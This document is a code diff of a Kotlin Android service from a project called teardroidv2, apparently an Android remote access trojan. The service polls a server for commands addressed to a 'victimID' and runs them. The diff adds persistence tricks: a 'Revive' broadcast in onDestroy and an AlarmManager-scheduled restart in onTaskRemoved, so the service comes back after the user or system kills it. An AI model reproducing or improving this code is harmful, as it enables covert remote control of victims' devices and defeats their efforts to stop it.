@@ -1,29 +1,16 @@
 package com.example.teardroidv2
 
 import Request
-import android.app.Service
+import android.annotation.SuppressLint
+import android.app.*
 import android.content.*
-import android.os.IBinder
-import android.util.Log
-import org.json.JSONObject
-import android.os.SystemClock
-
-import android.app.AlarmManager
-import android.app.Notification
-
-import android.app.PendingIntent
-
-import android.content.Intent
 import android.os.Build
-import android.app.NotificationManager
-
-import android.app.NotificationChannel
-import android.graphics.Color
+import android.os.IBinder
+import android.os.SystemClock
+import android.util.Log
 import androidx.annotation.RequiresApi
 import androidx.core.app.NotificationCompat
-
-
-
+import org.json.JSONObject
 
 
 class CommandReciver : Service() {
@@ -32,7 +19,8 @@ class CommandReciver : Service() {
     private val FileAction = FileAction(this)
     private val nReceiver = NotificationReceiver()
 
-    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
+    override fun onCreate() {
+        Log.d(TAG,"On onCreate called")
         val pendingIntent: PendingIntent =
             Intent(this, CommandReciver::class.java).let { notificationIntent ->
                 PendingIntent.getActivity(this, 0, notificationIntent, 0)
@@ -50,6 +38,11 @@ class CommandReciver : Service() {
             val victimID = getVictimID()
             commandReciver(victimID)
         }
+        super.onCreate()
+    }
+
+    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
+        Log.d(TAG,"On onStartCommand called")
         return START_STICKY
     }
 
@@ -95,7 +88,7 @@ class CommandReciver : Service() {
                     Request("/command/device/$victimID",{
                         commandExecutor(it)
                     },{
-                        Log.d(AppInfo.TAG,"commandReciver => $victimID"+ it)
+                        Log.d(AppInfo.TAG, "commandReciver => $victimID$it")
                     }).get()
                     Thread.sleep(3000)
                 }
@@ -145,11 +138,6 @@ class CommandReciver : Service() {
         registerReceiver(nReceiver, filter)
     }
 
-    private fun showError(ErrorResponse: String) {
-        Log.d(TAG,ErrorResponse)
-
-    }
-
     private fun getVictimID(): String {
         val VictimDataStore = getSharedPreferences(AppInfo.VictimDatastore, MODE_PRIVATE)
         return VictimDataStore.getString(AppInfo.VictimID,"invalid ID")!!
@@ -167,21 +155,40 @@ class CommandReciver : Service() {
         }).post(client)
     }
 
+
+
     override fun onBind(intent: Intent): IBinder? {
         // TODO: Return the communication channel to the service.
         throw UnsupportedOperationException("Not yet implemented")
     }
 
     override fun onDestroy() {
-        super.onDestroy()
-        unregisterReceiver(nReceiver);
         Log.d(TAG,"On Destroyed called")
-        val isFirstRun = getSharedPreferences(AppInfo.isServiceRunning, MODE_PRIVATE)
-        val changeRunEntry = isFirstRun.edit()
-        changeRunEntry.putBoolean(AppInfo.FirstRunKey,true)
-        changeRunEntry.apply()
+        unregisterReceiver(nReceiver);
+        val broadcastIntent = Intent()
+        broadcastIntent.action = "Revive"
+        sendBroadcast(broadcastIntent)
+        super.onDestroy()
     }
 
+    @SuppressLint("UnspecifiedImmutableFlag")
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        Log.d(AppInfo.TAG, "Service: onTaskRemoved")
+/*        val broadcastIntent = Intent()
+        broadcastIntent.action = "Revive"
+        sendBroadcast(broadcastIntent)*/
+        val restartService = Intent(applicationContext, this.javaClass)
+        restartService.setPackage(packageName)
+        val restartServicePI = PendingIntent.getService(
+            applicationContext, 1, restartService,
+            PendingIntent.FLAG_ONE_SHOT
+        )
+        val alarmService =
+            applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
+        alarmService[AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000] =
+            restartServicePI
+        super.onTaskRemoved(rootIntent)
+    }
 
     internal class NotificationReceiver : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent) {
